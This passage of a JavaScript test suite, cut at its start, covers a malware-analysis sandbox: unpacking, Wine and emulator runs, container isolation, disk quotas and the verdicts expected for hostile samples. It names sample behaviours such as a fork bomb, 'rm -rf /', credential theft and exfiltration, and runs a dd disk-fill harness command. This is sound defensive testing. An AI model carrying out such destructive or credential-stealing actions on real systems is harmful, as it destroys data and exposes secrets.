    assert.match(root.unwrap.detail, /^Unwrapped a UPX-packed program: 1 part\(s\)\.$/);
    assert.match(root.identify.detail, /packed with UPX/);
    const child = stepsOf(job, 1);
    assert.deepEqual([child.emulate.status, child.static.status], ['done', 'done'], 'the unpacked binary is emulated and checked');
    assert.ok(job.report.evidence.some(item => item.item === 1 && item.source === 'emulator' && item.kind === 'api-call'), 'the child\'s API calls are tagged item 1');
    assert.ok(job.report.verdict.signals.includes('obfuscated'));
    assert.deepEqual(job.report.verdict.findings, []);
    assert.equal(job.report.receipt.containers.filter(item => item.role === 'wine').length, 0, 'Wine is not approved: no container');
    clean(result);
  });

  test('AT-20: an Inno Setup installer is unwrapped with innoextract and its payload .exe is analysed as a child item', async () => {
    const result = await runPipeline({ file: exe('inno-inert-6.3.3.exe'), claimedName: 'setup.exe' });
    done(result);
    const { job } = result;
    const root = stepsOf(job, 0);
    assert.equal(root.unwrap.status, 'done');
    assert.match(root.unwrap.detail, /Inno Setup installer: 1 part\(s\); innoextract lists the installer files only; its \[Run\] entries are not exposed; setup data 6\.3\.0\./);
    const payload = coverage(job).find(event => event.item === 1);
    assert.equal(payload.parent, 0);
    assert.ok(payload.steps.some(step => step.step === 'emulate' && step.status === 'done'), 'the payload is emulated');
    clean(result);
  });

  test('AT-20 (limit): an installer made by an Inno Setup newer than innoextract reads is a failed unwrap step and an incomplete job, not a clean one', async () => {
    const result = await runPipeline({ file: exe('inno-inert-6.7.3.exe'), claimedName: 'setup.exe' });
    done(result);
    const root = stepsOf(result.job, 0);
    assert.equal(root.unwrap.status, 'failed');
    assert.match(root.unwrap.detail, /innoextract reads Inno Setup only up to 6\.3\.3/);
    assert.ok(result.job.report.verdict.signals.includes('incomplete'));
    clean(result);
  });

  test('exe with Wine not approved: the coverage list says "Wine: skipped (not approved)", Speakeasy emulates, capa and YARA find nothing in a program that only returns', async () => {
    const result = await runPipeline({ file: exe('probe-effects.exe'), claimedName: 'probe.exe' });
    done(result);
    const steps = stepsOf(result.job, 0);
    assert.equal(steps.wine.detail, 'Wine: skipped (not approved)');
    assert.ok(['done', 'stopped'].includes(steps.emulate.status), 'Speakeasy ran the program and may stop at an API it lacks');
    assert.equal(steps.static.status, 'done');
    assert.equal(result.job.report.file.path, 'emulate');
    assert.equal(result.job.report.receipt.containers.filter(item => item.role === 'wine').length, 0);
    assert.equal(result.job.report.receipt.notes, undefined);
    clean(result);
  });

  test('generic: strings, entropy, binwalk and YARA read a file nothing else understands; nothing runs; the job is incomplete', async () => {
    const result = await runPipeline({ file: BLOB, claimedName: 'blob.bin' });
    done(result);
    const steps = stepsOf(result.job, 0);
    assert.equal(steps.generic.status, 'done');
    assert.match(steps.generic.detail, /^Strings \(\d+ ASCII, \d+ UTF-16\), entropy [\d.]+, \d+ binwalk hit\(s\), YARA \d+ match\(es\)\.$/);
    assert.equal(steps.parser.status, 'skipped', 'no model in this run');
    assert.equal(result.job.report.file.path, 'inspect');
    assert.ok(result.job.report.verdict.signals.includes('incomplete'));
    clean(result);
  });

  test('AT-21: a model-written parser reads an unknown format in the analyse container; a crash is retried with stderr; the result is a Twilight signal and no finding', async () => {
    const replies = [
      '```python\nraise RuntimeError("parser boom")\n```',
      '```python\nimport json\ndata = open("/in/sample", "rb").read()\njson.dump(["obfuscated"] if data[:4] == b"BLOB" else [], open("signals.json", "w"))\n```',
    ];
    const prompts = [];
    const inference = { available: () => true, complete: async messages => { prompts.push(JSON.stringify(messages)); return replies.shift() ?? 'no script'; } };
    const result = await runPipeline({ file: BLOB, claimedName: 'blob.bin', inference });
    done(result);
    const { job } = result;
    const attempts = job.events.filter(item => item.event === 'parser-attempt').map(item => item.data);
    assert.deepEqual(attempts.map(attempt => [attempt.n, attempt.exitCode]), [[1, 1], [2, 0]]);
    assert.match(attempts[0].stderr, /parser boom/);
    assert.match(prompts[1], /parser boom/, 'the retry prompt carries the crash\'s stderr');
    assert.ok(job.report.verdict.signals.includes('obfuscated'));
    assert.deepEqual(job.report.verdict.findings, []);
    assert.equal(job.report.verdict.depth, 'twilight');
    assert.equal(stepsOf(job, 0).parser.status, 'done');
    clean(result);
  });

  describe('Wine (runc + seccomp-wine.json; DETONATION_WINE_RUNC=true)', { skip: wineMissing ?? false }, () => {
    const WINE_ENV = { ...ENV, DETONATION_WINE_RUNC: 'true' };
    const wineRun = name => runPipeline({ file: exe(name), claimedName: name, env: WINE_ENV });
    const wineContainer = result => result.job.report.receipt.containers.find(item => item.role === 'wine');

    test('the Wine harness runs a Wine built-in (cmd /c echo hi) in a verified runc container with the seccomp profile and the 6.3 flags', async () => {
      const { jobId, jobDir, dataDir } = jobFixture();
      try {
        assert.equal((await dockerExec(homeVolumeCreateArgs(jobId))).code, 0);
        const result = await runContainer({
          docker: dockerExec, jobId, role: 'wine', image: 'detonation-ocean/wine', jobDir, wallClockMs: 30_000, outputCapBytes: 4.5 * 1024 * 1024,
          command: ['--kind', 'builtin', '--builtin', 'cmd-echo', '--file', '/in/sample'],
        });
        assert.equal(result.code, 0, result.stderr);
        assert.deepEqual([result.isolation.role, result.isolation.runtime, result.isolation.pidsLimit, result.isolation.network], ['wine', 'runc', 128, 'none']);
        const inspected = JSON.parse(result.inspectJson)[0];
        assert.equal(inspected.HostConfig.SecurityOpt.filter(option => option.startsWith('seccomp=')).length, 1);
        const line = parseRunnerLine(result.stdout);
        const mapped = mapWine(line.wine, { at: new Date().toISOString() });
        assert.equal(mapped.status, 'done');
        assert.deepEqual(mapped.evidence.filter(item => item.kind === 'execve').map(item => item.path), ['C:\\windows\\system32\\cmd.exe']);
        assert.match(line.wine.stdout, /hi/);
      } finally {
        await teardown(jobId);
        rmSync(dataDir, { recursive: true, force: true });
      }
    });

    test('AT-22: a program that writes a Run key and a file in Documents and opens a window runs under Wine: persistence, the file in the diff, screenshots, "Ran under Wine"', async () => {
      const result = await wineRun('probe-effects.exe');
      done(result);
      const { job } = result;
      assert.equal(job.report.file.path, 'wine');
      assert.equal(job.events.find(item => item.event === 'typed').data.label, 'Ran under Wine');
      assert.deepEqual(job.report.verdict.findings.map(finding => finding.id), ['persistence']);
      assert.ok(job.report.evidence.some(item => item.source === 'registry' && item.kind === 'key-added' && /CurrentVersion\\Run$/.test(item.key)), 'the Run key is in the registry diff');
      assert.ok(job.report.evidence.some(item => item.source === 'diff' && item.kind === 'added' && /\/Documents\//.test(item.path)), 'the file in Documents is in the diff');
      const shots = [...job.artifacts.keys()].filter(name => /^wine-i0-.*\.png$/.test(name));
      assert.ok(shots.length >= 2, `screenshots ${shots}`);
      for (const name of shots) assert.ok(isValidPng(job.artifacts.get(name)), name);
      assert.ok(job.report.evidence.some(item => item.kind === 'screenshot' && item.artifact === shots[0]));
      assert.equal(stepsOf(job, 0).wine.status, 'done');
      assert.equal(stepsOf(job, 0).emulate.status, 'skipped');
      const container = wineContainer(result);
      assert.deepEqual([container.runtime, container.pidsLimit, container.network], ['runc', 128, 'none']);
      assert.match(job.report.receipt.notes[0], /^Ran under Wine without gVisor/);
      clean(result);
    });

    test('AT-23: a program that needs an unimplemented Windows function fails under Wine within 2 s and the chain moves on to Speakeasy; the coverage list shows both', async () => {
      const result = await wineRun('probe-missing-dll.exe');
      done(result);
      const steps = stepsOf(result.job, 0);
      assert.equal(steps.wine.status, 'failed');
      assert.match(steps.wine.detail, /^Wine could not run it/);
      assert.ok(['done', 'stopped', 'failed'].includes(steps.emulate.status), 'the emulator was tried');
      assert.equal(result.job.report.file.path, 'emulate');
      clean(result);
    });

    test('AT-24: a program that reads HKCU\\Software\\Wine and exits gets the anti-analysis signal', async () => {
      const result = await wineRun('probe-wine-check.exe');
      done(result);
      assert.ok(result.job.report.verdict.signals.includes('anti-analysis'));
      assert.deepEqual(result.job.report.verdict.findings, []);
      clean(result);
    });
  });
});

// Samples: everything below executes files from samples/ inside the sandbox. Do not enable without the safety amendment.
describe('samples (requires DETONATION_LIVE_SAMPLES=1)', { skip: process.env.DETONATION_LIVE_SAMPLES !== '1' ? 'set DETONATION_LIVE_SAMPLES=1 after the safety amendment' : (missing ?? false) }, () => {
  const sample = name => readFileSync(new URL(name, SAMPLES));
  const findingIds = job => job.report.verdict.findings.map(finding => finding.id).sort();
  const runs = new Map();
  const run = name => {
    if (!runs.has(name)) runs.set(name, runPipeline({ file: sample(name), claimedName: name }));
    return runs.get(name);
  };
  const durationOf = (seen, role) => {
    const state = JSON.parse(seen.inspected.findLast(item => item.name.includes(`-${role}-`)).json)[0].State;
    return Date.parse(state.FinishedAt) - Date.parse(state.StartedAt);
  };
  after(() => { for (const result of runs.values()) result.then(({ dataDir }) => rmSync(dataDir, { recursive: true, force: true }), () => {}); });

  test('AT-2: loop.js is killed within 30 s ± 2 s, limitsHit has time, the verdict is incomplete', async () => {
    const { job, seen } = await run('loop.js');
    assert.equal(job.state, 'done', job.error ?? '');
    const seconds = durationOf(seen, 'detonate') / 1000;
    assert.ok(seconds >= 28 && seconds <= 32, `killed after ${seconds} s`);
    assert.ok(job.report.receipt.limitsHit.includes('time'));
    assert.equal(job.report.verdict.complete, false);
    assert.ok(job.report.verdict.signals.includes('incomplete'));
  });

  test('AT-3: the fork bomb in invoice.py hits the pids limit and yields resource-hijack', async () => {
    const { job } = await run('invoice.py');
    assert.equal(job.state, 'done', job.error ?? '');
    assert.ok(job.report.receipt.limitsHit.includes('pids-limit'));
    assert.ok(findingIds(job).includes('resource-hijack'));
  });

  test('AT-4: balloon.py is OOMKilled: incomplete, never resource-hijack', async () => {
    const { job } = await run('balloon.py');
    assert.equal(job.state, 'done', job.error ?? '');
    assert.ok(job.report.receipt.limitsHit.includes('oom'));
    assert.equal(job.report.verdict.complete, false);
    assert.ok(!findingIds(job).includes('resource-hijack'));
  });

  test('AT-5: invoice.py rm -rf / yields system-wipe; the host canary and the WSL /bin are unchanged', async () => {
    const binBefore = readdirSync('/bin').sort();
    const shBefore = await hashFile('/bin/sh');
    const { job, dataDir, hostBefore } = await run('invoice.py');
    assert.equal(job.state, 'done', job.error ?? '');
    assert.ok(findingIds(job).includes('system-wipe'));
    assert.equal(job.report.receipt.hostCanary, 'unchanged');
    assert.equal(await hashFile(join(dataDir, 'host-canary')), hostBefore);
    assert.deepEqual(readdirSync('/bin').sort(), binBefore);
    assert.equal(await hashFile('/bin/sh'), shBefore);
  });

  test('AT-6: invoice.py yields exactly the five section 11 findings, and the canary token is in the connect/sendto payload evidence', async () => {
    const { job, seen } = await run('invoice.py');
    assert.deepEqual(findingIds(job), ['encrypt', 'exfil-attempt', 'resource-hijack', 'steal-credentials', 'system-wipe']);
    assert.match(seen.token, /^[A-Z0-9]{10}$/);
    assert.ok(job.report.evidence.some(item => (item.kind === 'connect' || item.kind === 'sendto') && String(item.payloadPreview).includes(seen.token)));
  });

  test('AT-7: self-temp.py writes and deletes its own temp files: no destroy-files', async () => {
    const { job } = await run('self-temp.py');
    assert.equal(job.state, 'done', job.error ?? '');
    assert.ok(!findingIds(job).includes('destroy-files'));
  });

  test('AT-8: clean-chart.py is Sunlight with complete: true', async () => {
    const { job } = await run('clean-chart.py');
    assert.equal(job.state, 'done', job.error ?? '');
    assert.equal(job.report.verdict.depth, 'sunlight');
    assert.equal(job.report.verdict.complete, true);
    assert.deepEqual(findingIds(job), []);
  });

  // M4 samples (README "Scripts and documents"). The Wine samples (hello.vbs, hello.bat, bin/*.exe) are not part of M4.
  const severity = job => job.report.verdict;
  const hasSignal = (job, id) => severity(job).signals.includes(id);

  test('M4: invoice.pdf.html is Midnight with fake-login and exfil-attempt, and carries type-mismatch (AT-14)', async () => {
    const { job } = await run('invoice.pdf.html');
    assert.equal(job.state, 'done', job.error ?? '');
    assert.equal(severity(job).depth, 'midnight');
    assert.deepEqual(findingIds(job), ['exfil-attempt', 'fake-login']);
    assert.ok(hasSignal(job, 'type-mismatch'));
  });

  test('M4: bundle.zip is Twilight (obfuscated): clean-chart.py and obfuscated-hello.ps1 run as child items', async () => {
    const { job } = await run('bundle.zip');
    assert.equal(job.state, 'done', job.error ?? '');
    assert.equal(severity(job).depth, 'twilight');
    assert.ok(hasSignal(job, 'obfuscated'));
    assert.deepEqual(findingIds(job), []);
    assert.equal(job.report.receipt.containers.filter(item => item.role === 'detonate').length, 3, 'the zip and two entries');
  });

  test('M4: report.pdf is Twilight: pdfid finds /OpenAction, /JS and /JavaScript, harm unproven', async () => {
    const { job } = await run('report.pdf');
    assert.equal(job.state, 'done', job.error ?? '');
    assert.equal(severity(job).depth, 'twilight');
    assert.ok(hasSignal(job, 'exploit-unproven'));
    const indicators = job.report.evidence.filter(item => item.kind === 'exploit-indicator').map(item => item.indicator);
    for (const name of ['pdf /OpenAction', 'pdf /JS', 'pdf /JavaScript']) assert.ok(indicators.includes(name), name);
    assert.deepEqual(findingIds(job), []);
  });

  test('M4: budget.docm is Twilight: olevba finds the AutoOpen macro, harm unproven', async () => {
    const { job } = await run('budget.docm');
    assert.equal(job.state, 'done', job.error ?? '');
    assert.equal(severity(job).depth, 'twilight');
    assert.ok(hasSignal(job, 'exploit-unproven'));
    assert.ok(job.report.evidence.some(item => item.kind === 'exploit-indicator' && /AutoOpen/.test(item.indicator)));
  });

  test('M4: hello.html is Sunlight, complete', async () => {
    const { job } = await run('hello.html');
    assert.equal(job.state, 'done', job.error ?? '');
    assert.deepEqual([severity(job).depth, severity(job).complete, findingIds(job)], ['sunlight', true, []]);
  });

  test('M4: badge.svg is Sunlight, complete', async () => {
    const { job } = await run('badge.svg');
    assert.equal(job.state, 'done', job.error ?? '');
    assert.deepEqual([severity(job).depth, severity(job).complete, findingIds(job)], ['sunlight', true, []]);
  });

  test('M4: notice.eml is Sunlight when the attachment run completes (its bundle.zip is unpacked to clean-chart.py)', async () => {
    const { job } = await run('notice.eml');
    assert.equal(job.state, 'done', job.error ?? '');
    assert.deepEqual([severity(job).depth, findingIds(job)], ['sunlight', []]);
    assert.equal(severity(job).complete, true);
  });

  // M4b samples (README "Wine samples"). They are Windows programs from samples/bin, run only here under the safety amendment, with Wine approved.
  // Written for AT-19 to AT-24; not run by the build that added them.
  const WINE_ENV = { ...ENV, DETONATION_WINE_RUNC: 'true' };
  const wineRuns = new Map();
  const runWine = name => {
    if (!wineRuns.has(name)) wineRuns.set(name, runPipeline({ file: sample(name), claimedName: name.split('/').at(-1), env: WINE_ENV }));
    return wineRuns.get(name);
  };
  after(() => { for (const result of wineRuns.values()) result.then(({ dataDir }) => rmSync(dataDir, { recursive: true, force: true }), () => {}); });
  const coverageOf = (job, item) => Object.fromEntries(job.events.filter(event => event.event === 'coverage').map(event => event.data).find(event => event.item === item).steps.map(step => [step.step, step]));

  test('AT-19 (sample): runkey-upx.exe is unpacked with upx -d and the unpacked program (item 1) runs', async () => {
    const { job } = await runWine('bin/runkey-upx.exe');
    assert.equal(job.state, 'done', job.error ?? '');
    assert.equal(coverageOf(job, 0).unwrap.status, 'done');
    const child = coverageOf(job, 1);
    assert.ok(child.wine.status === 'done' || child.emulate.status === 'done', 'the unpacked program ran under Wine or in the emulator');
  });

  test('AT-20 (sample): setup-demo.exe is unwrapped with innoextract and its payload is a child item; an Inno Setup newer than 6.3.3 is a failed, incomplete unwrap', async () => {
    const { job } = await runWine('bin/setup-demo.exe');
    assert.equal(job.state, 'done', job.error ?? '');
    const unwrap = coverageOf(job, 0).unwrap;
    if (unwrap.status === 'done') assert.ok(job.events.some(event => event.event === 'coverage' && event.data.item === 1 && event.data.parent === 0), 'the payload is item 1');
    else assert.ok(unwrap.status === 'failed' && /innoextract/.test(unwrap.detail) && job.report.verdict.signals.includes('incomplete'));
  });

  test('AT-22 (sample): runkey.exe runs under Wine, writes a Run key and a file in Documents and opens a window: persistence, the file in the diff, a screenshot, "Ran under Wine"', async () => {
    const { job } = await runWine('bin/runkey.exe');
    assert.equal(job.state, 'done', job.error ?? '');
    assert.equal(job.report.file.path, 'wine');
    assert.ok(findingIds(job).includes('persistence'));
    assert.ok(job.report.evidence.some(item => item.source === 'diff' && item.kind === 'added' && /\/Documents\//.test(item.path)));
    assert.ok([...job.artifacts.keys()].some(name => /^wine-i0-.*\.png$/.test(name)));
  });

  test('AT-23 (sample): needs-unimplemented.exe fails under Wine within 2 s and the chain moves on to Speakeasy; the coverage list shows both', async () => {
    const { job } = await runWine('bin/needs-unimplemented.exe');
    assert.equal(job.state, 'done', job.error ?? '');
    const steps = coverageOf(job, 0);
    assert.equal(steps.wine.status, 'failed');
    assert.ok(steps.emulate && steps.emulate.status !== 'skipped');
  });

  test('AT-24 (sample): wine-check.exe reads HKCU\\Software\\Wine and exits: the anti-analysis signal', async () => {
    const { job } = await runWine('bin/wine-check.exe');
    assert.equal(job.state, 'done', job.error ?? '');
    assert.ok(hasSignal(job, 'anti-analysis'));
  });

  test('M4b: hello.bat and hello.vbs run under Wine (cmd /c, wscript) and are inspected by the generic step first', async () => {
    for (const name of ['hello.bat', 'hello.vbs']) {
      const { job } = await runWine(name);
      assert.equal(job.state, 'done', job.error ?? '');
      const steps = coverageOf(job, 0);
      assert.equal(steps.generic.status, 'done', name);
      assert.ok(['done', 'stopped', 'failed'].includes(steps.wine.status), name);
    }
  });
});

describe('live home volume quota (docker + gVisor, harness commands only)', { skip: missing ?? false }, () => {
  const IMAGE = 'detonation-ocean/detonate';
  const MIB = 1024 * 1024;
  // Runs `sh -c <script>` in a real, verified container of `role` (the harness replaces the entrypoint; nothing from samples/ or an upload runs).
  const shell = (jobId, jobDir, role, script, itemIndex = 0) =>
    runContainer({ docker: withEntrypoint('sh'), jobId, role, image: `detonation-ocean/${role}`, jobDir, itemIndex, command: ['-c', script], wallClockMs: 30_000 });

  test('P1-3 (7.3): startHome caps the home volume at 128 MB, files survive from seed to detonate to collect, and teardown ends it all', async () => {
    const { jobId, jobDir, dataDir } = jobFixture();
    mkdirSync(join(jobDir, 'seed', 'Documents'), { recursive: true, mode: 0o755 });
    writeFileSync(join(jobDir, 'seed', 'Documents', 'notes.txt'), 'seeded-by-the-controller\n', { mode: 0o644 });
    try {
      const holder = await startHome({ jobId, image: IMAGE, jobDir });
      assert.equal(holder.role, 'holder');
      assert.equal(docker('inspect', '--format', '{{.State.Running}}', `do-${jobId}-holder`).stdout.trim(), 'true');
      assert.match(docker('volume', 'inspect', '--format', '{{json .Options}}', `do-${jobId}-home`).stdout, /"o":"nosuid,nodev,size=128m,uid=10001,gid=10001,mode=0700"/);

      await runSeed({ jobId, image: IMAGE, jobDir });
      const written = await shell(jobId, jobDir, 'detonate', 'cat /home/dana/Documents/notes.txt && echo written-by-detonate > /home/dana/Documents/dropped.txt', 0);
      assert.equal(written.code, 0, written.stderr);
      assert.equal(written.stdout, 'seeded-by-the-controller\n', 'the detonate container sees the seeded file');

      // A container that writes more than the quota with dd from /dev/zero (a harness command, not a sample) stops at the cap.
      const filled = await shell(jobId, jobDir, 'detonate', 'dd if=/dev/zero of=/home/dana/fill bs=1M count=200; echo "dd-exit=$?"; ls -l /home/dana/fill; df -m /home/dana', 1);
      console.log(`--- dd output ---\n${filled.stdout}${filled.stderr}-----------------`);
      assert.match(filled.stderr, /No space left on device/);
      assert.match(filled.stdout, /dd-exit=1/);
      const size = Number(/(\d+) \w{3} +\d+ +[\d:]+ \/home\/dana\/fill/.exec(filled.stdout)?.[1]);
      assert.ok(size > 100 * MIB && size <= 128 * MIB, `fill is ${size} bytes, expected between 100 MiB and 128 MiB`);

      // The next containers, a collect and a second detonate step, see both files and the filled file.
      const collected = await shell(jobId, jobDir, 'collect', 'cat /home/dana/Documents/dropped.txt; ls /home/dana/fill; touch /home/dana/x 2>&1 | head -1', 0);
      assert.equal(collected.code, 0, collected.stderr);
      assert.match(collected.stdout, /^written-by-detonate\n\/home\/dana\/fill\n.*Read-only file system/s);
    } finally {
      const removed = await teardown(jobId);
      assert.equal(removed.confirmed, true, removed.errors.join('; '));
      assert.deepEqual(leftovers(jobId), ['', ''], 'no container (holder included) or volume is left');
      assert.equal(docker('volume', 'inspect', `do-${jobId}-home`).status, 1);
      rmSync(dataDir, { recursive: true, force: true });
    }
  });

  test('P1-3 (why a holder exists): without it a tmpfs volume is empty again for the next container', async () => {
    const { jobId, jobDir, dataDir } = jobFixture();
    try {
      assert.equal((await dockerExec(quotaHomeVolumeCreateArgs(jobId))).code, 0);
      const first = await shell(jobId, jobDir, 'detonate', 'echo lost > /home/dana/data.txt && cat /home/dana/data.txt');
      assert.equal(first.stdout, 'lost\n');
      const second = await shell(jobId, jobDir, 'detonate', 'ls /home/dana | wc -l; cat /home/dana/data.txt', 1);
      assert.match(second.stdout, /^0\n/, 'the file is gone once no container uses the volume');
    } finally {
      await teardown(jobId);
      rmSync(dataDir, { recursive: true, force: true });
    }
  });

  test('P1-4 live: the reaper deletes only the ledger\'s runsc log directory and leaves a look-alike alone', async () => {
    const { jobId, jobDir, dataDir } = jobFixture();
    const ledger = createContainerLedger();
    const foreign = 'f'.repeat(64);
    try {
      assert.equal((await dockerExec(homeVolumeCreateArgs(jobId))).code, 0);
      const ran = await runContainer({ docker: withEntrypoint('true'), jobId, role: 'collect', image: 'detonation-ocean/collect', jobDir, wallClockMs: 20_000, ledger });
      const id = JSON.parse(ran.inspectJson)[0].Id;
      mkdirSync(join(LOG_ROOT, foreign), { recursive: true });
      assert.deepEqual(ledger.ids(), [id]);
      await teardown(jobId, { ledger });
      const later = new Date(Date.now() + 3_600_000);
      const result = await reap(60_000, { clock: () => later, ledger });
      assert.deepEqual(result.removed.logs, []);
      assert.equal(existsSync(join(LOG_ROOT, foreign)), true, 'a directory that is not in the ledger is never deleted');
      assert.deepEqual(ledger.ids(), [], 'teardown already forgot the removed container');
    } finally {
      rmSync(join(LOG_ROOT, foreign), { recursive: true, force: true });
      await teardown(jobId);
      rmSync(dataDir, { recursive: true, force: true });
    }
  });
});
